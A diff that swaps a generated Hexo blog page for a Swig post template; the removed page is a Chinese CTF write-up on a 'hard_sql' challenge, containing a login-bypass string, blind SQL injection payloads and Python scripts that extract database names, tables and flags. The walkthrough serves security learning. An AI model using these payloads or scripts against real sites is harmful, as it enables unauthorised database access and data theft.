@@ -1,286 +1,37 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
+{% extends '_layout.swig' %}
+{% import '_macro/post.swig' as post_template %}
+{% import '_macro/sidebar.swig' as sidebar_template %}
 
-  
-  <title>V1lu0实验室招新hard_sql | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00 前置知识1.sql盲注。     2.sql语法中ascii()函数，substr()等字符串处理函数，case when分支结构等控制语句。    3.python脚本编写能力。     0x01 解题首先拿到题目，给出了一个登录框，并提示后台做了过滤。这里依然先尝试万能密码。admin&#39; or 1&#x3D;1 #发现登录成功，但是只有Login Success，没有其他任何信息。ad">
-<meta property="og:type" content="article">
-<meta property="og:title" content="V1lu0实验室招新hard_sql">
-<meta property="og:url" content="https://su29029.github.io/2020/08/28/V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard-sql/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="0x00 前置知识1.sql盲注。     2.sql语法中ascii()函数，substr()等字符串处理函数，case when分支结构等控制语句。    3.python脚本编写能力。     0x01 解题首先拿到题目，给出了一个登录框，并提示后台做了过滤。这里依然先尝试万能密码。admin&#39; or 1&#x3D;1 #发现登录成功，但是只有Login Success，没有其他任何信息。ad">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-08-28T02:38:31.000Z">
-<meta property="article:modified_time" content="2020-08-28T02:38:46.527Z">
-<meta property="article:author" content="John Doe">
-<meta property="article:tag" content="web安全">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
 
-<meta name="generator" content="Hexo 5.1.1"></head>
+{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://su29029.github.io"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-V1lu0实验室招新hard-sql" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/28/V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard-sql/" class="article-date">
-  <time datetime="2020-08-28T02:38:31.000Z" itemprop="datePublished">2020-08-28</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
-  </div>
+{% block page_class %}page-post-detail{% endblock %}
 
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      V1lu0实验室招新hard_sql
-    </h1>
-  
 
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><p>1.sql盲注。    </p>
-<p>2.sql语法中ascii()函数，substr()等字符串处理函数，case when分支结构等控制语句。   </p>
-<p>3.python脚本编写能力。    </p>
-<h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>首先拿到题目，给出了一个登录框，并提示后台做了过滤。这里依然先尝试万能密码。<code>admin&#39; or 1=1 #</code>发现登录成功，但是只有Login Success，没有其他任何信息。<code>admin&#39; #</code> 发现提示something wrong.</p>
-<p>由于只提示有错误而不说明错误内容，这里无法使用联合查询或报错注入。故考虑盲注。   </p>
-<p>给出第一步payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr(database(),1,1))) when &#39;104&#39; then pow(999,999) end %23pass&#x3D;123</span><br></pre></td></tr></table></figure>
+{% block content %}
 
-<p>解释一下，substr(string, index, length)函数用于截取string字符串从index位开始长度为length的子串，ascii()函数用于将字符转换为ascii码，case (statement) when ‘..’ then ….. when ‘..’ then ….. end类似switch的用法，判断某个statement的值，如果满足下面when的某个条件就执行then后的语句。而pow(999,999)执行一定会报错（数据溢出）。故如果<code>ascii(substr(database(),1,1))</code>的值等于104的话，数据库会报错，回显something wrong.如果值不等于，则不执行，回显wrong username password.这样我们通过判断database()的每一位是否等于某个ascii码转换后的值，就可以得出数据库名。    </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and case (ascii(substr(database(), &#123;&#125;,1))) when &#x27;&#123;&#125;&#x27; then pow(999,999) end %23&amp;pass=123&quot;</span>.format(i, j)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(j, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>
+  <div id="posts" class="posts-expand">
+    {{ post_template.render(page) }}
 
-<p>最终得到数据库名<code>hard_sql</code>.   </p>
-<p>下一步爆表名。第二步payload：   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema&#x3D;&quot;hard_sql&quot;),1,1))) when &#39;102&#39; then pow(999,999) end %23pass&#x3D;123</span><br></pre></td></tr></table></figure>
-
-<p>通过group_concat函数查询表名。   </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and case (ascii(substr((Select group_concat(table_name) from Information_schema.tables where table_schema=\&quot;hard_sql\&quot;), &#123;&#125;,1))) when &#x27;&#123;&#125;&#x27; then pow(999,999) end %23&amp;pass=123&quot;</span>.format(i, j)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(j, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>
-
-<p>最终得到所有数据表名<code>flag,users</code>.   </p>
-<p>最后一步获取列名，但是发现column被过滤且无法绕过，故考虑无列名注入。   </p>
-<p>先判断列数，仍然使用上述payload来判断。   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr((Select &#96;1&#96; from (Select 1 union Select * from hard_sql.flag) as a limit 1,1), 1,1))) when &#39;1000&#39; then pow(999,999) end %23&amp;pass&#x3D;123</span><br></pre></td></tr></table></figure>
-
-<p>发现提示something wrong.说明列数错误(因为ascii码值不可能等于1000，但是报错了说明是前面语句出现问题，在没有语法错误的情况下只可能是列数错误)，故增加列数，最后发现一共有5列。因为使用如下payload时没有提示something wrong 而是 wrong username password.   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user&#x3D;1&#39; and case (ascii(substr((Select &#96;1&#96; from (Select 1,2,3,4,5 union Select * from hard_sql.flag) as a limit 1,1), 1,1))) when &#39;1000&#39; then pow(999,999) end %23&amp;pass&#x3D;123</span><br></pre></td></tr></table></figure>
-
-<p>爆出该表的所有列的所有内容(一行一行来)：   </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>, <span class="number">32</span>, <span class="number">-1</span>):</span><br><span class="line">            payload = <span class="string">&quot;?user=1&#x27; and case (ascii(substr((Select `&#123;&#125;` from (Select 1,2,3,4,5 union Select * from hard_sql.flag) as a limit 1,1), &#123;&#125;,1))) when &#x27;&#123;&#125;&#x27; then pow(999,999) end %23&amp;pass=123&quot;</span>.format(m, i, j)</span><br><span class="line">            url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">                print(chr(j))</span><br><span class="line">                index = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;-----------------&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>最终结果：   </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;&#123;&#123;&#123;&#123;&#123;&#123;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mini~~~</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_not_a_flag&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffllaagg&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sql_1s_s0_c00000001lllll!!!!!!&#125;</span><br></pre></td></tr></table></figure>
-<p>最后一个是真正的flag。<br>成功获得flag。   </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://su29029.github.io/2020/08/28/V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard-sql/" data-id="ckedn8mt9000efctycv3t9wdy" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2020/08/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          文件上传学习
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">php反序列化总结</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/c%E8%AF%AD%E8%A8%80/">c语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/web%E5%BC%80%E5%8F%91/">web开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">网络编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows%E7%BC%96%E7%A8%8B/">windows编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/">软件工程</a></li></ul>
+    <div class="post-spread">
+      {% if theme.jiathis %}
+        {% include '_partials/share/jiathis.swig' %}
+      {% elseif theme.baidushare %}
+        {% include '_partials/share/baidushare.swig' %}
+      {% elseif theme.add_this_id %}
+        {% include '_partials/share/add-this.swig' %}
+      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
+        {% include '_partials/share/duoshuo_share.swig' %}
+      {% endif %}
     </div>
   </div>
 
+{% endblock %}
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%BC%80%E5%8F%91/" rel="tag">web开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%E7%BC%96%E7%A8%8B/" rel="tag">windows编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" rel="tag">网络编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/" rel="tag">软件工程</a></li></ul>
-    </div>
-  </div>
+{% block sidebar %}
+  {{ sidebar_template.render(true) }}
+{% endblock %}
 
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">c语言</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">web安全</a> <a href="/tags/web%E5%BC%80%E5%8F%91/" style="font-size: 15px;">web开发</a> <a href="/tags/windows%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">windows编程</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;">算法</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">网络编程</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a> <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/" style="font-size: 10px;">软件工程</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2020/08/28/%E6%B4%9B%E8%B0%B7%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1-1-2-3%E7%BB%84/">洛谷刷题记录(1)(1,2,3组)</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/28/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">ctfshow萌新计划刷题记录</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/28/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/">buu刷题记录1</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/28/csrf-ssrf-session%E4%BC%AA%E9%80%A0/">csrf&amp;ssrf&amp;session伪造</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/28/xxe%E9%97%AE%E9%A2%98/">xxe问题</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2020 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
-</body>
-</html>
+{% block script_extra %}
+  {% include '_scripts/pages/post-details.swig' %}
+{% endblock %}
